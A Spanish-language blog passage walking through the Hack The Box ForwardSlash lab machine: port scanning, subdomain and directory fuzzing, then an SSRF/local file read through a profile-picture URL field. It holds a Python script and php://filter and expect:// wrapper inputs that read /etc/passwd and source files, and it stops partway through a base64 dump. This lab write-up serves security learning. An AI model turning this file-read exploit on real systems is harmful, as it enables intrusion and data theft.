<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box ForwardSlash - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina ForwardSlash en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box ForwardSlash">
<meta property="og:url" content="http://localhost:4000/htb-forwardslash/">


  <meta property="og:description" content="Resolución de la máquina ForwardSlash en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-forwardslash/forwardslash.jpg">





  <meta property="article:published_time" content="2022-01-23T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-forwardslash/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">Contacto</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box ForwardSlash</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box ForwardSlash">
    <meta itemprop="description" content="Resolución de la máquina ForwardSlash en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="January 23, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box ForwardSlash
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-23T00:00:00-06:00">January 23, 2022 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-forwardslash/banner-forwardslash.jpg" alt=""></p>

<h2 id="forwardslash">ForwardSlash</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.183.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.183
PING 10.10.10.183 <span class="o">(</span>10.10.10.183<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.183: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>136 ms

<span class="nt">---</span> 10.10.10.183 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 135.862/135.862/135.862/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.183 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-16 19:01 CST
Initiating Ping Scan at 19:01
Scanning 10.10.10.183 <span class="o">[</span>4 ports]
Completed Ping Scan at 19:01, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 19:01
Scanning 10.10.10.183 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.183
Discovered open port 80/tcp on 10.10.10.183
Completed SYN Stealth Scan at 19:01, 36.51s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.183
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>36.84 seconds
           Raw packets sent: 67701 <span class="o">(</span>2.979MB<span class="o">)</span> | Rcvd: 67698 <span class="o">(</span>2.708MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.183
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.183 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-16 19:03 CST
Nmap scan report <span class="k">for </span>10.10.10.183
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf <span class="o">(</span>RSA<span class="o">)</span>
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Did not follow redirect to http://forwardslash.htb
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.62 seconds
</code></pre></div></div>

<p>Vemos la respuesta del lado del servidor y se aplica un redirect hacia el dominio <code class="language-plaintext highlighter-rouge">forwardslash.htb</code>; por lo tanto, vamos a agregar el dominio a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y despúes vamos a correr la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> para ver a lo que nos enfrentamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.183
http://10.10.10.183 <span class="o">[</span>302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.183], RedirectLocation[http://forwardslash.htb]
http://forwardslash.htb <span class="o">[</span>200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.183], Title[Backslash Gang]
❯ whatweb http://forwardslash.htb/
http://forwardslash.htb/ <span class="o">[</span>200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.183], Title[Backslash Gang]
</code></pre></div></div>

<p>No vemos nada interesante, así que vamos a echarle un ojo vía web.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web.png" alt=""></p>

<p>Se trata de un <strong><em>defacement</em></strong> en el cual nos dan unas posibles pistas; pero fuera de eso, no vemos nada interesante, así que vamos a tratar de descubrir nuevos recursos dentro del servidor empezando por <code class="language-plaintext highlighter-rouge">nmap</code> y luego herramientas mas tochas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.10.183
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-22 19:08 CST
Nmap scan report <span class="k">for </span>forwardslash.htb <span class="o">(</span>10.10.10.183<span class="o">)</span>
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.61 seconds
</code></pre></div></div>

<p>No obtenemos información, así que vamos con <code class="language-plaintext highlighter-rouge">wfuzz</code> y tratar de descubrir subdominios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>422 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.forwardslash.htb"</span> http://forwardslash.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forwardslash.htb/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000001626:   200        39 L     99 W       1267 Ch     "backup"                                                        
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 122
Filtered Requests: 121
Requests/sec.: 0
</span></code></pre></div></div>

<p>Tenemos un subdominios que es <code class="language-plaintext highlighter-rouge">backup.forwardslash.htb</code>, así que vamos a agregarlo a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y a echarle un ojo a ver que tiene.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web1.png" alt=""></p>

<p>Tenemos un panel de login y además podría contar con un panel de registro; asi que antes de intentar cualquier cosa, vamos a tratar de registrarnos y ver a lo que tenemos acceso.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web2.png" alt=""></p>

<p>Aquí algo que ya nos debería llamar la atención sería <strong>Change Your Profile Picture</strong>, a que nos permitiría subir archivos.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web3.png" alt=""></p>

<p>Al ingresar vemos que nos dice que se ha deshabilitado los items, pero igual y podríamos habilitarlos para despúes hacer una consulta; esto lo logramos dando click secundario en el sitio web y seleccionar la opción de <strong>Inspeccionar</strong>, ahí nos muestra el código fuente del sitio y sobre los campos <strong>input</strong> damos click secundario y elegimos <strong>Editar como HTML</strong> y eliminamos la parte donde dice <strong>disabled=”“</strong>.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web4.png" alt=""></p>

<p>Con esto se nos habilitan dichos campos y si escribimos cualquier cosa en donde dice <strong>URL</strong> y luego damos click en <strong>Submit</strong>, vemos que la petición se tramita; por lo tanto, vamos a ver si puede acceder a un recurso de nuestra máquina, por lo que nos compartimos un servicio HTTP con python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.183 - - <span class="o">[</span>22/Jan/2022 19:39:12] <span class="s2">"GET /test.php HTTP/1.0"</span> 200 -
</code></pre></div></div>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web5.png" alt=""></p>

<p>Vemos que la consulta se realiza, ahora vamos a ver si podemos ver archivos internos de la máquina, como el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web6.png" alt=""></p>

<p>También podemos ver recursos internos de la máquina. Como es un poco incómodo andar cambiando varias veces el item <strong>input</strong> quitando el disable, vamos a crearnos un programa en python.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding: utf'8
</span>
<span class="kn">import</span> <span class="nn">signal</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">re</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="n">url_login</span> <span class="o">=</span> <span class="s">"http://backup.forwardslash.htb/login.php"</span>
<span class="n">url_picture</span> <span class="o">=</span> <span class="s">"http://backup.forwardslash.htb/profilepicture.php"</span>

<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
    <span class="n">data_login</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'username'</span> <span class="p">:</span> <span class="s">'k4miyo'</span><span class="p">,</span>
        <span class="s">'password'</span> <span class="p">:</span> <span class="s">'k4miyo123'</span>
    <span class="p">}</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data_login</span><span class="p">)</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"URL: "</span><span class="p">)</span>
        <span class="n">data_picture</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">'url'</span> <span class="p">:</span> <span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">filename</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_picture</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data_picture</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'&lt;/html&gt;.*'</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'&lt;/html&gt;'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">makeRequest</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 shell.py                                              
URL: /etc/hosts                                                 
                                                                                                                                 
127.0.0.1 localhost                                             
127.0.1.1 forwardslash backup.forwardslash.htb forwardslash.htb                                                                  
                                                                                                                                 
                                                                
<span class="c"># The following lines are desirable for IPv6 capable hosts      </span>
::1     ip6-localhost ip6-loopback                              
fe00::0 ip6-localnet                                            
ff00::0 ip6-mcastprefix                                         
ff02::1 ip6-allnodes                                            
ff02::2 ip6-allrouters                                          
                                                                
URL:
</code></pre></div></div>

<p>Ya con la utilidad podemos ver los contenidos de archivos de una manera más cómoda. Vamos a probar algunos archivos interesantes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 shell.py
URL: http://10.10.14.27/test.php

&lt;?php
        <span class="nb">echo</span> <span class="s2">"Hola mundo!"</span><span class="p">;</span>
?&gt;

URL: /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false

URL: /proc/net/tcp

  sl  local_address rem_address   st tx_queue rx_queue <span class="nb">tr </span>tm-&gt;when retrnsmt   uid  <span class="nb">timeout </span>inode                                                     
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 23510 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25960 1 0000000000000000 100 0 0 10 0                     
   2: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   111        0 26426 1 0000000000000000 100 0 0 10 0                     
   3: 0100007F:D3D6 0101007F:0050 01 00000000:00000000 00:00000000 00000000    33        0 40648 2 0000000000000000 20 0 0 10 <span class="nt">-1</span>                     
   4: B70A0A0A:B0B6 01010101:0035 02 00000001:00000000 01:00000296 00000003   101        0 40646 2 0000000000000000 800 0 0 1 7                      

URL: /proc/sched_debug                                                                                                           
                                                                                                                                 Sched Debug Version: v0.11, 4.15.0-91-generic <span class="c">#92-Ubuntu                                                                         </span>
ktime                                   : 6288733.538397                                                                         sched_clk                               : 6289009.681041                                                                         
cpu_clk                                 : 6288716.334719                                                                         jiffies                                 : 4296464479                                                                             
sched_clock_stable<span class="o">()</span>                    : 1                                                                                                                                                                                                                       
sysctl_sched                                                                                                                       .sysctl_sched_latency                    : 12.000000                                                                           
  .sysctl_sched_min_granularity            : 1.500000                                                                              .sysctl_sched_wakeup_granularity         : 2.000000                                                                            
  .sysctl_sched_child_runs_first           : 0                                                                                     .sysctl_sched_features                   : 2021179                                                                             
  .sysctl_sched_tunable_scaling            : 1 <span class="o">(</span>logaritmic<span class="o">)</span>

...

 I kworker/u256:2  2036     33445.014821      6225   120         0.000000       312.580155         0.000000 0 0 /
 I kworker/u256:0  2122     33449.984484      1848   120         0.000000        96.526395         0.000000 0 0 /
 I    kworker/1:2  2123     32793.937781         8   120         0.000000         0.202239         0.000000 0 0 /


URL:
</code></pre></div></div>

<p>Podemos acceder a recursos de la máquina atacante, pero no se nos interpreta, así que también podriamos tratar de utilizar wrappers:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: file:///etc/hosts

127.0.0.1 localhost
127.0.1.1 forwardslash backup.forwardslash.htb forwardslash.htb


<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

URL: expect://whoami


URL: 
</code></pre></div></div>

<p>No obtenemos algo que nos ayude a ingresar a la máquina víctima, asi que lo que podriamos hacer es tratar de buscar directorios y/o recursos bajo <code class="language-plaintext highlighter-rouge">backup.forwardslash.htb/</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>33 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://backup.forwardslash.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000834:   301        9 L      28 W       332 Ch      "dev"                                                           
^C000000977:   404        9 L      31 W       285 Ch      "announce"                                                      

Total time: 17.73565
Processed Requests: 976
Filtered Requests: 975
Requests/sec.: 55.03040
</span></code></pre></div></div>

<p>Tenemos el directorio <code class="language-plaintext highlighter-rouge">dev</code>, vamos a echarle un ojito.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web7.png" alt=""></p>

<p>Vemos una respuesta algo personalizadas, por lo que podría pensar que debemos estar apuntando a un recurso por defecto como <strong>index.php</strong>.</p>

<p><img src="/assets/images/htb-forwardslash/forwardslash-web8.png" alt=""></p>

<p>Y es correcto, entonces podríamos tratar de ver el contenido de dicho archivo con nuestro programa en python que desarrollamos y vamos a suponer que la ruta interna de dicho archivo está en <code class="language-plaintext highlighter-rouge">/var/www/backup.forwardslash.htb/dev/index.php</code> y además, como es un archivo php, lo más seguro es que el servidor lo interprete, así que haremos uso de un wrapper para convertirlo en base64:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap python3 shell.py
php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/backup.forwardslash.htb/dev/index.php

PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8